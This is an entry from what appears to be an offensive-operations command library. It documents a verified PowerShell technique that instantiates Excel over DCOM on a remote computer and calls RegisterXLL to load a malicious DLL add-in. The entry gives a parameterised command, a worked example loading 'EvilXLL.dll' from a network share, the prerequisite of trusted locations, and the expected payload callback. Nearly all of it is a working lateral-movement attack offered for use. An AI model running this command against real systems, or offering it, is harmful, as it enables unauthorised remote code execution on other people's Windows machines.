---
type: command
executor: powershell
data: >-
  $excel =
  [activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application",
  "$_TARGET_COMPUTER")); $excel.RegisterXLL("$_XLL_PATH"); $excel.Quit()
output: null
platforms:
  - Windows
tags:
  - dcom
  - remote-execution
  - dll-injection
verified: true
validated: true
---

# Excel-RegisterXLL-Remote-Execution

## Command

```powershell
$excel = [activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application", "$_TARGET_COMPUTER"))
$excel.RegisterXLL("$_XLL_PATH")
$excel.Quit()
```

## Description

Registers a malicious XLL (Excel DLL add-in) on a remote Excel instance via DCOM, triggering code execution upon load. Requires trusted network locations enabled for reliability.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_TARGET_COMPUTER | Target system name | Yes |
| $_XLL_PATH | UNC or local path to the malicious XLL file | Yes |

## Examples

### Basic Usage

```powershell
$excel = [activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application", "TARGET-PC"))
$excel.RegisterXLL("\\\\TARGET-PC\\share\\EvilXLL.dll")
$excel.Quit()
```

### Advanced Usage

Requires prior registry modification for trusted locations.

## Expected Output

Silent success if XLL loads; DLL entry point executes (e.g., payload callback). Errors if security blocks network XLLs.

## Related

- [[procedures/DCOM-Office-Remote-Code-Execution]]
